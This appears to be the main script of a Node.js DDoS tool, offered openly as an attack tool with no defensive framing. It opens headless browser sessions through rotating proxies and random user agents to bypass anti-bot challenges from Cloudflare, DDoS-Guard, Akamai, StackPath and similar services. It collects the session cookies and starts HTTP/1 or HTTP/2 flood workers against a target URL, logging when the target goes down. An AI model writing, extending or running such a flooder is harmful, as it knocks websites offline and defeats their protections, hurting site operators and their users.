// // Error log
// process.on('uncaughtException', function(er) {
//     console.log(er);
// });
// process.on('unhandledRejection', function(er) {
//     console.log(er);
// });

require('events').EventEmitter.defaultMaxListeners = 0;
(ignoreNames = [
  "RequestError",
  "StatusCodeError",
  "CaptchaError",
  "CloudflareError",
  "ParseError",
  "ParserError",
]),
(ignoreCodes = [
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
    "ERR_SSL_WRONG_VERSION_NUMBER",
    "HPE_INVALID_CONSTANT",
    "ERR_SSL_DECRYPTION_FAILED_OR_BAD_RECORD_MAC",
    "ERR_HTTP2_STREAM_ERROR",
    "ERR_HTTP2_ERROR",
]);

var isEmpty = function(obj) {
    return Object.keys(obj).length === 0;
}

process.on("uncaughtException", function (e) {
if((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name)))
    return false;
    console.warn(e);
}).on("unhandledRejection", function (e) {
if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name)))
    return false;
    console.warn(e);
}).on("warning", (e) => {
if((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name)))
    return false;
    console.warn(e);
}).on("SIGHUP", () => {
    return 1;
}).on("SIGCHILD", () => {
    return 1;
});

const colors = require("colors");
var CustomsARGVS = require("minimist")(process.argv.slice(2));
const fs = require("fs");
let target = CustomsARGVS.target.split('""')[0];
const time = CustomsARGVS.time;

// Browser Config
let length_browsers = 350;
let NumOPenBrowser = 3;

// Other
let PostaMOD = undefined;
let rff = undefined;
let cookie_CTM = undefined;
let connections = CustomsARGVS.connections;
let delay = CustomsARGVS.delay;
let ListIDS = [];
let Idbrw = 0;
let idsRunned = [];
// let attacks = [];

if(CustomsARGVS.postdata){
  if(CustomsARGVS.postdata.includes("~")){
    CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/~/g, "&");
  }
  if(CustomsARGVS.postdata.includes("*")){
    CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/\*/g, "%");
  }
}

if(CustomsARGVS.customCookie){
  if(CustomsARGVS.customCookie.includes("~")){
    CustomsARGVS.customCookie = CustomsARGVS.customCookie.replace(/~/g, ";");
  }
}

if(CustomsARGVS.httpversion == 'HTTP1') {
    var httpversion = 'HTTP/1';
} else if(CustomsARGVS.httpversion == 'HTTP2') {
    var httpversion = 'HTTP/2';
} else {
    var httpversion = 'HTTP/1';
}
if(target.includes("*")){
  target = target.replace(/\*/g, "%");
}

var VarsDefinetions = {
  Objetive: target,
  Method_raw: CustomsARGVS.method,
  time: time,
};

proxies = fs.readFileSync(`${CustomsARGVS.proxy}`).toString().match(/\S+/g);
const proxies_total = proxies.length - 2;
log(`[` + `info`.cyan + `]` + ``+` Proxies: ` + `${proxies_total + 2}`);

UserAgents = fs.readFileSync(`${CustomsARGVS.ua}`, "utf8").split('\n');
const UserAgents_total = UserAgents.length - 2;
log(`[` + `info`.cyan + `]` + ``+` UserAgents: ` + `${UserAgents_total + 2}`);

function ProxyGenerate() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function UserAgentGenerate() {
    return UserAgents[Math.floor(Math.random() * UserAgents.length)];
}

function log(string) {
    let d = new Date();
  
    let hours = (d.getHours() < 10 ? "0" : "") + d.getHours();
    let minutes = (d.getMinutes() < 10 ? "0" : "") + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? "0" : "") + d.getSeconds();
  
    console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
}

var launch_browser = async function launch_browser(Custom = {}) {
    Idbrw++;
    let RunSessions = require("./browser/browserEngine.js");
    let IdBrowser = Custom.IdBrowser;
    const Proxy = Custom.Proxy;
    const UserAgent = Custom.UserAgent;

    const resposense = await RunSessions.RunSessions({
        IdBrowser: IdBrowser,
        Proxy: Proxy,
        UserAgent: UserAgent,
        Domain: VarsDefinetions.Objetive,
    });

    let CookieSet;
    let TitleRes;
    let Protection;
    try {
    CookieSet = resposense[IdBrowser].split(":::")[0];
    } catch {}
    try {
    TitleRes = resposense[IdBrowser].split(":::")[2];
    } catch {}
    try {
    Protection = resposense[IdBrowser].split(":::")[3];
    } catch {}

    if(!(Protection)) {
        Protection = 'Unknown'
    }

    var protections = [
        ["Security Check..", "Security Check.."],
        ["Please Wait... | Cloudflare", "CloudFlare hCaptcha"],
        ["Just a moment...", "CloudFlare JS Challenge"],
        ["DDOS-GUARD", "DDoS-Guard JS Challenge/hCaptcha"],
        ["You are being redirected...", "Akamai JS Challenge"],
        ["Just a moment please...", "BlazingFast/Mitigated.network JS Challenge"],
        ["Captcha Challenge", "VShield Captcha"],
        ["Checking your browser...", "VShield JS Challenge"],
        ["Validating Request", "Expimont JS Challenge"],
        ["Site verification", "StackPath Challenge"],
        ["TurkWAF", "TurkWaf Captcha Challenge"],
        ["Authentication required", "Combhaton JS Challenge"],
        ["Attention Required! vDDoS Protection", "vDDoS Captcha"],
        ["StackPath", "StackPath JS Challenge"]
    ];

    try {
        protections.forEach(element => {
            if(TitleRes.includes(element[0])) {
                log(`Session `+element[1].yellow+` bypass failed`.red+` -> ${Proxy}`.cyan);
                ListIDS.push(IdBrowser);
                throw 'Break';
            }
        });
    } catch (e) {
        if (e == 'Break') {return;}
    }

    var errors1 = [
        ["Access Denied", "Access Denied"],
        ["Rate Limited", "Rate Limited"],
        ["Blocked", "Blocked"],
        ["restrict access", "Restricted access"],
        ["cf_chl_prog=b;", "Invalid CF Cookie"],
    ]

    try {
        errors1.forEach(element => {
            if(TitleRes.includes(element[0])) {
                log(`Session `+element[1].yellow+` bypass failed`.red+` -> ${Proxy}`.cyan);
                ListIDS.push(IdBrowser);
                throw 'Break';
            }
        });
    } catch (e) {
        if (e == 'Break') {return;}
    }

    var errors2 = [
        ["Error 502", "Target Down"],
        ["Error 504", "Target Down"],
        ["502: Bad gateway", "Target Down"],
        ["504: Gateway time-out", "Target Down"],
        ["521: Web server is down", "Target Down"],
        ["520: Web server is returning an unknown error", "Target Down"],
        ["522: Connection timed out", "Target Down"],
        ["523: Web server is down", "Target Down"],
        ["523: Origin Is Unreachable", "Target Down"],
        ["524: A Timeout Occurred", "Target Down"],
        ["525: SSL handshake failed", "Target Down"],
        ["526: Invalid SSL certificate", "Target Down"],
        ["524: A timeout occurred", "Target Down"],
        ["500: internal server error", "Target Down"],
        ["500 Internal Server Error", "Target Down"]
    ]

    try {
        errors2.forEach(element => {
            if(TitleRes.includes(element[0])) {
                log(`Session `+element[1].yellow+``.red+` -> ${Proxy}`.cyan);
                ListIDS.push(IdBrowser);
                throw 'Break';
            }
        });
    } catch (e) {
        if (e == 'Break') {return;}
    }

    if (resposense == undefined) {
        log(`Session `+`Target/Proxy Down`.red+` -> ${Proxy}`.cyan);
        ListIDS.push(IdBrowser);
        return;
    } else if(isEmpty(CookieSet)) {
        log(`Session `+`No bypass Data`.yellow+``.red+` -> ${Proxy}`.cyan);
        ListIDS.push(IdBrowser);
        return;
    // } else if(CookieSet == ".") {
    //     log(`Session `+`/`.yellow+` bypass failed`.red+` -> ${Proxy}`.cyan);
    //     ListIDS.push(IdBrowser);
    //     return;
    } else {
        // log(`Browsers received (${browser_saves.split("#").length})`);
        log(`Session `+Protection.yellow+` bypassed successfully`.green+` -> ${Proxy} (${UserAgent})`.cyan);
        log(`Session Title: `+TitleRes+` -> ${Proxy} (${UserAgent})`.cyan);
        // log(`Session Cookies: `+CookieSet+` -> ${Proxy} (${UserAgent})`.cyan);

        // attacks.push({Proxy: Proxy, Cookies: CookieSet, Ua: UASet});
        setTimeout( async function() {
            await setFlooder(Proxy,resposense[IdBrowser].split(":::")[0],resposense[IdBrowser].split(":::")[1])
        }, delay * 1000);

        ListIDS.push(IdBrowser);
    }
};

// setInterval(
//     async function () {
//         array.forEach(attacks => {
//             await setFlooder(Proxy,CookieSet,UASet)
//         });
//     }, 30 * 1000
// )

log(`[` + `info`.cyan + `]` + ``+` Target: `+`${target}`);
log(`[` + `info`.cyan + `]` + ``+` HTTP Version: `+`${httpversion}`);
log(`[` + `info`.cyan + `]` + ``+` Method: `+`${VarsDefinetions.Method_raw}`);
log(`[` + `info`.cyan + `]` + ``+` Geo: `+`${CustomsARGVS.proxy}`);

var myInterval = setInterval(function () {
    if (ListIDS.length >= length_browsers) {
        clearInterval(myInterval);
        log(`[success]`+` Attcak proccess finished, idle set.`);
    } else if (ListIDS.length == idsRunned.length) {
        for (let j = 0; j < NumOPenBrowser; j++) { 
            const Proxy = ProxyGenerate();
            const UserAgent = UserAgentGenerate();
            idsRunned.push(Idbrw);
            launch_browser({ IdBrowser: Idbrw, UserAgent: UserAgent, Proxy: Proxy});
        }

        // log(`[` + `info`.cyan + `]` + ` Starting interval`);
    } else if (ListIDS.length == length_browsers && ListIDS.length < (50 / 100) * length_browsers) {
        log(`[success] Cookies recolected!`);
    }
}, 500);

function setFlooder(ip,cookie,ua) {
    // console.log(ip+'~~~'+cookie+'~~~'+ua)
    if(CustomsARGVS.postdata){
        PostaMOD = encodeURI(CustomsARGVS.postdata);
    } else {
        PostaMOD = undefined;
    }

    try {
        if (
            (CustomsARGVS.referer.includes("//") == true) &
            (CustomsARGVS.referer.includes(".") == true) &&
            CustomsARGVS.referer.includes("//") == true
        ) {
            rff = CustomsARGVS.referer;
        }
    } catch (error) {
        rff = target;
    }

    try {
        if (
            (CustomsARGVS.customCookie.includes("=") == true)
        ) {
            cookie_CTM = ";" + CustomsARGVS.customCookie;
        }
    } catch (error) {
        cookie_CTM = ""; //null
    }

    if(CustomsARGVS.httpversion == 'HTTP2') {
        require("./browser/flooder.js").flooderhttp2(
            (option = {
                ip: ip,
                cookie: cookie,
                ua: ua,
                rff: rff,
                target: VarsDefinetions.Objetive,
                userAgent: ua,
                addcookie: cookie_CTM,
                TimeATTACK: VarsDefinetions.time,
                METHOD: VarsDefinetions.Method_raw,
                PostData: PostaMOD,
                connections: connections
            })
        );
    } else if(CustomsARGVS.httpversion == 'HTTP1') {
        require("./browser/flooder.js").flooderhttp1(
            (option = {
                ip: ip,
                cookie: cookie,
                ua: ua,
                rff: rff,
                target: VarsDefinetions.Objetive,
                userAgent: ua,
                addcookie: cookie_CTM,
                TimeATTACK: VarsDefinetions.time,
                METHOD: VarsDefinetions.Method_raw,
                PostData: PostaMOD,
                connections: connections
            })
        );
    } else {
        console.clear();
        log(`[` + `info`.cyan + `]` + ``+` Insert HTTP Version.`);
        process.exit(1);
    }

    log(`Session `+httpversion+` Flooder Started `+`-> ${ip} (${ua})`.cyan);
}

setTimeout(() => {
    console.clear();
    log(`[` + `info`.cyan + `]` + ``+` Done.`);
    process.exit(1);
}, time * 1000);